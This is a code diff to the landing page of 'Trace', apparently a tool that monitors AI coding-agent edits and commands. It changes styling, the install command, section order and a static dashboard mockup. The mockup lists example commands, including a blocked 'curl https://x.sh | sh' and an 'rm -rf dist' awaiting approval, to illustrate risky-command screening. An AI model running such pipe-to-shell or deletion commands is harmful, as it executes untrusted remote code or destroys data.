@@ -91,7 +91,7 @@ export default function Home() {
               href={DOCS_URL}
               target="_blank"
               rel="noreferrer"
-              className="rounded bg-brand px-5 py-2.5 text-sm font-medium text-white hover:bg-brand-dim"
+              className="rounded bg-brand px-5 py-2.5 text-sm font-medium text-bg hover:bg-brand-dim"
             >
               Read the docs
             </a>
@@ -104,7 +104,7 @@ export default function Home() {
           </div>
           <div className="mt-8 max-w-[440px]">
             <div className="mb-1.5 text-xs uppercase tracking-wide text-text-dim">Get started</div>
-            <Cmd>brew install trace</Cmd>
+            <Cmd>npm install -g trace</Cmd>
           </div>
         </div>
 
@@ -119,6 +119,9 @@ export default function Home() {
         <ProofItem title="Review every patch" desc="See the exact code delta before it ships, grounded in the real Git diff." />
         <ProofItem title="Roll back safely" desc="Git-backed checkpoints before each monitored run. Reject risky AI edits with one command." />
       </div>
+
+      {/* ---------- Download ---------- */}
+      <Download />
 
       {/* ---------- Dashboard preview ---------- */}
       <Section
@@ -191,9 +194,6 @@ export default function Home() {
         </div>
       </Section>
 
-      {/* ---------- Download ---------- */}
-      <Download />
-
       {/* ---------- Roadmap ---------- */}
       <Section
         title="Built for solo developers first. Teams next."
@@ -211,7 +211,7 @@ export default function Home() {
         <h2 className="text-2xl font-semibold">See every AI edit before it ships.</h2>
         <p className="mt-2 text-text-dim">Review the diff. Check the cost. Roll back safely.</p>
         <div className="mt-6 flex flex-wrap justify-center gap-3">
-          <a href="#download" className="rounded bg-brand px-5 py-2.5 text-sm font-medium text-white hover:bg-brand-dim">
+          <a href="#download" className="rounded bg-brand px-5 py-2.5 text-sm font-medium text-bg hover:bg-brand-dim">
             Install the CLI
           </a>
           <a href={GITHUB_REPO} target="_blank" rel="noreferrer" className="rounded border border-border px-5 py-2.5 text-sm font-medium text-text hover:border-brand-dim">
@@ -235,37 +235,39 @@ function ProofItem({ title, desc }: { title: string; desc: string }) {
   );
 }
 
-/** Static dashboard mockup for the hero — mirrors the real dashboard's own
- * card/badge language exactly, not a stylized "hero graphic". */
+const NAV_ITEMS = ["Dashboard", "Session Timeline", "Patch Review", "Command Risk", "Token Spend", "Rollback"];
+
+/** Static dashboard mockup — mirrors the real dashboard's own layout and
+ * type scale (see apps/web), not a stylized "hero graphic". No fake browser
+ * chrome; the daemon URL is the only "window" cue, same as the real app. */
 function DashboardMockup() {
   return (
     <div className="overflow-hidden rounded-md border border-border bg-surface" aria-hidden="true">
-      <div className="flex items-center gap-2 border-b border-border bg-black/30 px-3.5 py-2.5">
-        <span className="h-2.5 w-2.5 rounded-full bg-bad" />
-        <span className="h-2.5 w-2.5 rounded-full bg-warn" />
-        <span className="h-2.5 w-2.5 rounded-full bg-good" />
-        <span className="ml-2 font-mono text-xs text-text-dim">127.0.0.1:8757 — Trace</span>
+      <div className="border-b border-border px-4 py-2.5 font-mono text-xs text-text-dim">
+        127.0.0.1:8757 — Trace
       </div>
-      <div className="grid grid-cols-[112px_1fr] min-h-[300px]">
-        <div className="border-r border-border bg-black/20 p-2 text-xs">
-          {["Dashboard", "Session Timeline", "Patch Review", "Command Risk", "Token Spend", "Rollback"].map((n, i) => (
+      <div className="grid grid-cols-[160px_1fr]">
+        <div className="border-r border-border p-3 text-sm">
+          {NAV_ITEMS.map((n, i) => (
             <div
               key={n}
-              className={`mb-0.5 rounded-sm px-2 py-1.5 ${i === 0 ? "bg-surface-2 text-text" : "text-text-dim"}`}
+              className={`mb-1 rounded-sm px-2.5 py-1.5 ${i === 0 ? "bg-surface-2 text-text" : "text-text-dim"}`}
             >
               {n}
             </div>
           ))}
         </div>
-        <div className="space-y-2 p-3.5">
-          <MockRow cmd={'claude "fix the login bug"'} status="completed" tone="good" />
-          <MockRow cmd="npm test" status="passed" tone="good" />
-          <MockRow cmd="rm -rf dist" status="approval" tone="warn" />
-          <MockRow cmd="curl https://x.sh | sh" status="blocked" tone="bad" />
-          <div className="mt-3 grid grid-cols-3 gap-2">
-            <MockStat value="7" label="files" />
-            <MockStat value="1" label="secret" />
+        <div className="p-4">
+          <div className="mb-4 grid grid-cols-3 gap-3">
+            <MockStat value="7" label="files changed" />
+            <MockStat value="1" label="secret warning" />
             <MockStat value="$0.04" label="est. cost" />
+          </div>
+          <div className="space-y-2">
+            <MockRow cmd={'claude "fix the login bug"'} status="completed" tone="good" />
+            <MockRow cmd="npm test" status="passed" tone="good" />
+            <MockRow cmd="rm -rf dist" status="approval" tone="warn" />
+            <MockRow cmd="curl https://x.sh | sh" status="blocked" tone="bad" />
           </div>
         </div>
       </div>
@@ -274,11 +276,14 @@ function DashboardMockup() {
 }
 
 function MockRow({ cmd, status, tone }: { cmd: string; status: string; tone: "good" | "warn" | "bad" }) {
-  const toneClass = { good: "text-good", warn: "text-warn", bad: "text-bad" }[tone];
+  const dotClass = { good: "bg-good", warn: "bg-warn", bad: "bg-bad" }[tone];
   return (
-    <div className="flex items-center justify-between rounded-sm border border-border bg-black/20 px-2.5 py-2">
+    <div className="flex items-center justify-between rounded-sm border border-border px-3 py-2">
       <span className="font-mono text-xs text-text">{cmd}</span>
-      <span className={`text-[11px] font-medium uppercase tracking-wide ${toneClass}`}>{status}</span>
+      <span className="flex items-center gap-1.5 text-[11px] font-medium text-text-dim">
+        <span className={`h-1.5 w-1.5 rounded-full ${dotClass}`} />
+        {status}
+      </span>
     </div>
   );
 }
